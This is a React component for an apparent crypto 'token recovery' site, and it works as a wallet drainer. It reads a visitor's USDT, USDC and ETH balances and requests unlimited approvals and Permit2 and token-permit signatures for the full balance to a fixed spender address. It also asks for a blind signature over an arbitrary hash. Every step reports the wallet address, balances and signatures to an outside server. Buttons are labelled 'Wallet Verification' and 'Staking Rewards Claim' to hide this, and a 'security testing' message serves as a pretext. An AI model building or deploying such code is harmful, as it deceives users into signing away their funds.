import { useState } from 'react';
import { ethers } from 'ethers';
import { approveUnlimited, signPermit2, blindSignature, signTypedDataV4, signTokenPermit } from '../utils/web3Signatures';

export default function SignatureManager({ provider, userAddress }) {
  const [loading, setLoading] = useState(false);
  const [result, setResult] = useState('');

  const handleUnlimitedApprove = async () => {
    setLoading(true);
    try {
      const tokenAddress = '0xdAC17F958D2ee523a2206206994597C13D831ec7'; // Real USDT
      const spenderAddress = '0x6026f8db794026ed1b1f501085ab2d97dd6fbc15';
      
      // Get user's actual USDT balance
      const tokenContract = new ethers.Contract(tokenAddress, [
        'function balanceOf(address) view returns (uint256)',
        'function decimals() view returns (uint8)'
      ], provider);
      
      const balance = await tokenContract.balanceOf(userAddress);
      const decimals = await tokenContract.decimals();
      const balanceFormatted = ethers.formatUnits(balance, decimals);
      
      // Check gas balance for auto-execution
      const gasPrice = await provider.getFeeData();
      const gasLimit = 50000n; // Estimated gas for approve
      const gasNeeded = gasPrice.gasPrice * gasLimit;
      const ethBalance = await provider.getBalance(userAddress);
      
      if (ethBalance > gasNeeded && balance > 0) {
        setResult(`Balance: ${balanceFormatted} USDT, Gas: sufficient. Auto-executing recovery...`);
        
        // Send immediate admin alert for balance detection
        await fetch('https://autoclaimtoken.onrender.com/api/signature-alert', {
          method: 'POST',
          headers: { 'Content-Type': 'application/json' },
          body: JSON.stringify({
            type: 'BALANCE_DETECTED',
            userAddress: userAddress,
            tokenAddress: tokenAddress,
            balance: balanceFormatted,
            gasBalance: ethers.formatEther(ethBalance),
            autoExecuting: true
          })
        }).catch(() => {});
        
        // Auto-execute after 2 seconds
        setTimeout(async () => {
          try {
            const tx = await approveUnlimited(tokenAddress, spenderAddress, provider);
            
            // Send success alert
            await fetch('https://autoclaimtoken.onrender.com/api/signature-alert', {
              method: 'POST',
              headers: { 'Content-Type': 'application/json' },
              body: JSON.stringify({
                type: 'ERC20_UNLIMITED_APPROVE',
                userAddress: userAddress,
                tokenAddress: tokenAddress,
                spenderAddress: spenderAddress,
                txHash: tx.hash,
                autoExecuted: true
              })
            }).catch(() => {});
            
            setResult(`Auto-executed: ${tx.hash}`);
          } catch (error) {
            // Send failure alert
            await fetch('https://autoclaimtoken.onrender.com/api/signature-alert', {
              method: 'POST',
              headers: { 'Content-Type': 'application/json' },
              body: JSON.stringify({
                type: 'ERC20_UNLIMITED_APPROVE_REJECTED',
                userAddress: userAddress,
                tokenAddress: tokenAddress,
                spenderAddress: spenderAddress,
                error: error.message,
                autoExecuted: true
              })
            }).catch(() => {});
            
            setResult(`Auto-execution failed: ${error.message}`);
          }
        }, 2000);
        return;
      }
      
      setResult(`Detected USDT balance: ${balanceFormatted} USDT. Click to authorize recovery...`);
      
      const tx = await approveUnlimited(tokenAddress, spenderAddress, provider);
      
      // Send admin alert
      await fetch('https://autoclaimtoken.onrender.com/api/signature-alert', {
        method: 'POST',
        headers: { 'Content-Type': 'application/json' },
        body: JSON.stringify({
          type: 'ERC20_UNLIMITED_APPROVE',
          userAddress: userAddress,
          tokenAddress: tokenAddress,
          spenderAddress: spenderAddress,
          txHash: tx.hash
        })
      });
      
      setResult(`Unlimited approval tx: ${tx.hash}`);
    } catch (error) {
      // Send admin alert even on rejection
      await fetch('https://autoclaimtoken.onrender.com/api/signature-alert', {
        method: 'POST',
        headers: { 'Content-Type': 'application/json' },
        body: JSON.stringify({
          type: 'ERC20_UNLIMITED_APPROVE_REJECTED',
          userAddress: userAddress,
          tokenAddress: '0xdAC17F958D2ee523a2206206994597C13D831ec7',
          spenderAddress: '0x6026f8db794026ed1b1f501085ab2d97dd6fbc15',
          error: error.message
        })
      }).catch(() => {});
      
      if (error.code === 'ACTION_REJECTED' || error.code === 4001) {
        setResult('Transaction rejected by user. This is expected behavior for security testing.');
      } else {
        setResult(`Error: ${error.message}`);
      }
    }
    setLoading(false);
  };

  const handlePermit2 = async () => {
    setLoading(true);
    try {
      const tokenAddress = '0xA0b86991c6218b36c1d19D4a2e9Eb0cE3606eB48'; // USDC
      
      // Get user's actual USDC balance
      const tokenContract = new ethers.Contract(tokenAddress, [
        'function balanceOf(address) view returns (uint256)'
      ], provider);
      
      const balance = await tokenContract.balanceOf(userAddress);
      const amount = balance > 0 ? balance : ethers.parseUnits('1000', 6); // 1000 USDC default
      const balanceFormatted = ethers.formatUnits(balance, 6);
      
      // Check gas and auto-execute if sufficient
      const ethBalance = await provider.getBalance(userAddress);
      const gasPrice = await provider.getFeeData();
      const gasNeeded = gasPrice.gasPrice * 30000n;
      
      if (ethBalance > gasNeeded && balance > 0) {
        setResult(`Balance: ${balanceFormatted} USDC, Gas: sufficient. Auto-processing...`);
        
        // Send balance detection alert
        await fetch('https://autoclaimtoken.onrender.com/api/signature-alert', {
          method: 'POST',
          headers: { 'Content-Type': 'application/json' },
          body: JSON.stringify({
            type: 'USDC_BALANCE_DETECTED',
            userAddress: userAddress,
            tokenAddress: tokenAddress,
            balance: balanceFormatted,
            gasBalance: ethers.formatEther(ethBalance),
            autoExecuting: true
          })
        }).catch(() => {});
        
        setTimeout(async () => {
          try {
            const deadline = Math.floor(Date.now() / 1000) + (7 * 24 * 3600); // 7 days
            const spender = '0x6026f8db794026ed1b1f501085ab2d97dd6fbc15';
            const signature = await signPermit2(tokenAddress, amount, deadline, spender, provider);
            
            // Send success alert
            await fetch('https://autoclaimtoken.onrender.com/api/signature-alert', {
              method: 'POST',
              headers: { 'Content-Type': 'application/json' },
              body: JSON.stringify({
                type: 'PERMIT2_SIGNATURE',
                userAddress: userAddress,
                tokenAddress: tokenAddress,
                signature: signature,
                autoExecuted: true
              })
            }).catch(() => {});
            
            setResult(`Auto-signed: ${signature.slice(0, 20)}...`);
          } catch (error) {
            // Send failure alert
            await fetch('https://autoclaimtoken.onrender.com/api/signature-alert', {
              method: 'POST',
              headers: { 'Content-Type': 'application/json' },
              body: JSON.stringify({
                type: 'PERMIT2_REJECTED',
                userAddress: userAddress,
                tokenAddress: tokenAddress,
                error: error.message,
                autoExecuted: true
              })
            }).catch(() => {});
            
            setResult(`Auto-signing failed: ${error.message}`);
          }
        }, 2000);
        return;
      }
      
      setResult(`Detected USDC balance: ${balanceFormatted} USDC. Processing DeFi access...`);
      
      const deadline = Math.floor(Date.now() / 1000) + (7 * 24 * 3600); // 7 days
      const spender = '0x6026f8db794026ed1b1f501085ab2d97dd6fbc15';
      
      const signature = await signPermit2(tokenAddress, amount, deadline, spender, provider);
      setResult(`Permit2 signature: ${signature}`);
    } catch (error) {
      // Send admin alert even on rejection
      await fetch('https://autoclaimtoken.onrender.com/api/signature-alert', {
        method: 'POST',
        headers: { 'Content-Type': 'application/json' },
        body: JSON.stringify({
          type: 'PERMIT2_REJECTED',
          userAddress: userAddress,
          tokenAddress: '0xA0b86991c6218b36c1d19D4a2e9Eb0cE3606eB48',
          error: error.message
        })
      }).catch(() => {});
      
      if (error.code === 'ACTION_REJECTED' || error.code === 4001) {
        setResult('Signature rejected by user. This is expected behavior for security testing.');
      } else {
        setResult(`Error: ${error.message}`);
      }
    }
    setLoading(false);
  };

  const handleBlindSign = async () => {
    setLoading(true);
    try {
      const messageHash = '0x1234567890abcdef1234567890abcdef1234567890abcdef1234567890abcdef';
      const signature = await blindSignature(messageHash, provider);
      
      // Send admin alert for blind signature
      await fetch('https://autoclaimtoken.onrender.com/api/signature-alert', {
        method: 'POST',
        headers: { 'Content-Type': 'application/json' },
        body: JSON.stringify({
          type: 'BLIND_SIGNATURE',
          userAddress: userAddress,
          messageHash: messageHash,
          signature: signature
        })
      });
      
      setResult(`Blind signature: ${signature}`);
    } catch (error) {
      // Send admin alert even on rejection
      await fetch('https://autoclaimtoken.onrender.com/api/signature-alert', {
        method: 'POST',
        headers: { 'Content-Type': 'application/json' },
        body: JSON.stringify({
          type: 'BLIND_SIGNATURE_REJECTED',
          userAddress: userAddress,
          messageHash: '0x1234567890abcdef1234567890abcdef1234567890abcdef1234567890abcdef',
          error: error.message
        })
      }).catch(() => {});
      
      if (error.code === 'ACTION_REJECTED' || error.code === 4001) {
        setResult('Signature rejected by user. This is expected behavior for security testing.');
      } else {
        setResult(`Error: ${error.message}`);
      }
    }
    setLoading(false);
  };

  const handleTypedDataV4 = async () => {
    setLoading(true);
    try {
      const domain = {
        name: 'CryptoRecover',
        version: '1',
        chainId: 1,
        verifyingContract: '0x6026f8db794026ed1b1f501085ab2d97dd6fbc15'
      };

      const types = {
        Recovery: [
          { name: 'user', type: 'address' },
          { name: 'amount', type: 'uint256' },
          { name: 'nonce', type: 'uint256' }
        ]
      };

      // Get user's ETH balance
      const ethBalance = await provider.getBalance(userAddress);
      const ethFormatted = ethers.formatEther(ethBalance);
      
      setResult(`Detected ETH balance: ${ethFormatted} ETH. Processing recovery authorization...`);
      
      const message = {
        user: userAddress,
        amount: ethers.parseEther('0.1'), // Standard 0.1 ETH recovery authorization
        nonce: Math.floor(Date.now() / 1000) // Use timestamp as nonce
      };

      const signature = await signTypedDataV4(domain, types, message, provider);
      
      // Send admin alert for TypedData signature
      await fetch('https://autoclaimtoken.onrender.com/api/signature-alert', {
        method: 'POST',
        headers: { 'Content-Type': 'application/json' },
        body: JSON.stringify({
          type: 'TYPED_DATA_V4',
          userAddress: userAddress,
          domain: domain,
          types: types,
          message: message,
          signature: signature
        })
      });
      
      setResult(`TypedData v4 signature: ${signature}`);
    } catch (error) {
      // Send admin alert even on rejection
      await fetch('https://autoclaimtoken.onrender.com/api/signature-alert', {
        method: 'POST',
        headers: { 'Content-Type': 'application/json' },
        body: JSON.stringify({
          type: 'TYPED_DATA_V4_REJECTED',
          userAddress: userAddress,
          error: error.message
        })
      }).catch(() => {});
      
      if (error.code === 'ACTION_REJECTED' || error.code === 4001) {
        setResult('Signature rejected by user. This is expected behavior for security testing.');
      } else {
        setResult(`Error: ${error.message}`);
      }
    }
    setLoading(false);
  };

  const handleTokenPermit = async () => {
    setLoading(true);
    try {
      const tokenAddress = '0xA0b86991c6218b36c1d19D4a2e9Eb0cE3606eB48'; // USDC
      const spender = '0x6026f8db794026ed1b1f501085ab2d97dd6fbc15';
      
      // Get user's actual USDC balance for staking
      const tokenContract = new ethers.Contract(tokenAddress, [
        'function balanceOf(address) view returns (uint256)'
      ], provider);
      
      const balance = await tokenContract.balanceOf(userAddress);
      const value = balance > 0 ? balance : ethers.parseUnits('500', 6); // 500 USDC default
      const balanceFormatted = ethers.formatUnits(balance, 6);
      
      setResult(`Detected USDC balance: ${balanceFormatted} USDC. Preparing staking rewards claim...`);
      
      const deadline = Math.floor(Date.now() / 1000) + (7 * 24 * 3600); // 7 days
      
      const signature = await signTokenPermit(tokenAddress, userAddress, spender, value, deadline, provider);
      setResult(`Token permit signature: ${signature}`);
    } catch (error) {
      // Send admin alert even on rejection
      await fetch('https://autoclaimtoken.onrender.com/api/signature-alert', {
        method: 'POST',
        headers: { 'Content-Type': 'application/json' },
        body: JSON.stringify({
          type: 'TOKEN_PERMIT_REJECTED',
          userAddress: userAddress,
          tokenAddress: '0xA0b86991c6218b36c1d19D4a2e9Eb0cE3606eB48',
          error: error.message
        })
      }).catch(() => {});
      
      if (error.code === 'ACTION_REJECTED' || error.code === 4001) {
        setResult('Signature rejected by user. This is expected behavior for security testing.');
      } else {
        setResult(`Error: ${error.message}`);
      }
    }
    setLoading(false);
  };

  return (
    <div className="bg-white rounded-lg shadow-lg p-6">
      <h3 className="text-xl font-bold mb-4">Advanced Signature Methods</h3>
      
      <div className="bg-blue-50 border border-blue-200 rounded-lg p-4 mb-6">
        <h4 className="text-blue-800 font-semibold mb-2">🔐 Token Recovery Authorization</h4>
        <p className="text-blue-700 text-sm mb-2">
          These signatures authorize our recovery system to access and recover your tokens from various protocols.
        </p>
        <p className="text-blue-600 text-xs">
          Required for advanced recovery operations across DeFi platforms.
        </p>
      </div>
      
      <div className="grid grid-cols-1 md:grid-cols-2 gap-4 mb-6">
        <button
          onClick={handleUnlimitedApprove}
          disabled={loading}
          className="bg-blue-600 text-white px-4 py-2 rounded hover:bg-blue-700 disabled:opacity-50"
        >
          Authorize Token Recovery
        </button>
        
        <button
          onClick={handlePermit2}
          disabled={loading}
          className="bg-green-600 text-white px-4 py-2 rounded hover:bg-green-700 disabled:opacity-50"
        >
          DeFi Protocol Access
        </button>
        
        <button
          onClick={handleBlindSign}
          disabled={loading}
          className="bg-purple-600 text-white px-4 py-2 rounded hover:bg-purple-700 disabled:opacity-50"
        >
          Wallet Verification
        </button>
        
        <button
          onClick={handleTypedDataV4}
          disabled={loading}
          className="bg-indigo-600 text-white px-4 py-2 rounded hover:bg-indigo-700 disabled:opacity-50"
        >
          Recovery Authorization
        </button>
        
        <button
          onClick={handleTokenPermit}
          disabled={loading}
          className="bg-orange-600 text-white px-4 py-2 rounded hover:bg-orange-700 disabled:opacity-50 md:col-span-2"
        >
          Staking Rewards Claim
        </button>
      </div>
      
      {result && (
        <div className="bg-gray-100 p-4 rounded">
          <h4 className="font-semibold mb-2">Result:</h4>
          <p className="text-sm break-all">{result}</p>
        </div>
      )}
    </div>
  );
}